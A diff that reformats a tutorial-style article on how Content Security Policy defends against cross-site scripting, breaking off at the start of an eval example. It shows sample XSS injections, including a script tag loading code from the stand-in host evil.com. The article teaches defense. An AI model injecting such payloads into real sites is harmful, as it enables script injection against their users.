@@ -9,27 +9,33 @@ This article brings forth a way to integrate the __defense in depth__ concept to
 The increase in XSS (Cross-Site Scripting), clickjacking, and cross-site leak vulnerabilities demands a more __defense in depth__ security approach.
 
 ### Defense against XSS
-CSP defends against XSS attacks in the following ways: 
+
+CSP defends against XSS attacks in the following ways:
 
 #### 1. Restricting Inline Scripts
 
-By preventing the page from executing inline scripts, attacks like injecting 
+By preventing the page from executing inline scripts, attacks like injecting
+
 ```html
 <script>alert("XSS)</script>
 ```
+
  will not work.
 
 #### 2. Restricting Remote Scripts
 
-By preventing the page from loading scripts from arbitrary servers, attacks like injecting 
+By preventing the page from loading scripts from arbitrary servers, attacks like injecting
+
 ```html
 <script src="https://evil.com/hacked.js"></script>
 ```
+
 will not work.
 
 #### 3. Restricting Unsafe Javascript
 
-By preventing the page from executing text-to-JavaScript functions like `eval`, the website will be safe from vulnerabilities like the this: 
+By preventing the page from executing text-to-JavaScript functions like `eval`, the website will be safe from vulnerabilities like the this:
+
 ```js
 // A Simple Calculator
 var op1 = getUrlParameter("op1");
